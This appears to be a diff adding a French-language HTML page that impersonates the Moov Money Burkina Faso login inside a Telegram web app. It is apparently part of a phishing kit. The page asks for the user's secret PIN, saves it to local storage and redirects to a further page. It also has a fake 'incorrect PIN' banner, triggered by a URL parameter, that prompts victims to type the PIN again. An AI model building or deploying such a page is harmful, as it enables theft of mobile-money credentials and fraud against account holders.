@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money Burkina Faso - Connexion</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0044cc; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f0f4f8; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 35px 24px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,68,204,0.08); }
+        h2 { text-align: center; color: var(--moov-blue); margin-top: 0; font-size: 24px; font-weight: 800; }
+        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 14px; font-weight: 700; color: #333; margin-bottom: 8px; }
+        .form-control { font-size: 16px; padding: 14px; border: 1px solid #cbd5e1; border-radius: 10px; outline: none; }
+        .btn-submit { width: 100%; background-color: var(--moov-orange); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        .error-banner { background: #fee2e2; color: #dc2626; border: 1px solid #fecaca; padding: 12px; border-radius: 8px; font-size: 13.5px; margin-bottom: 20px; text-align: center; font-weight: 600; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Connexion Moov Money</h2>
+    <p style="text-align: center; font-size: 14px; color: #666; margin-bottom: 24px;">Entrez votre code PIN secret pour accéder à votre compte.</p>
+
+    <div id="errorBanner" class="error-banner">Code PIN incorrect. Veuillez réessayer.</div>
+
+    <form onsubmit="handleLogin(event)">
+        <div class="form-group">
+            <label for="pin">Code PIN (4 ou 5 chiffres)</label>
+            <input type="password" id="pin" class="form-control" placeholder="••••" maxlength="5" pattern="\d{4,5}" required autocomplete="current-password">
+        </div>
+        <button type="submit" class="btn-submit">Se Connecter</button>
+    </form>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === 'wrongpin') {
+            document.getElementById('errorBanner').style.display = 'block';
+        }
+    });
+
+    function handleLogin(event) {
+        event.preventDefault();
+        const pin = document.getElementById('pin').value.trim();
+        localStorage.setItem('lastPin', pin);
+        window.location.href = "/page7";
+    }
+</script>
+</body>
+</html>
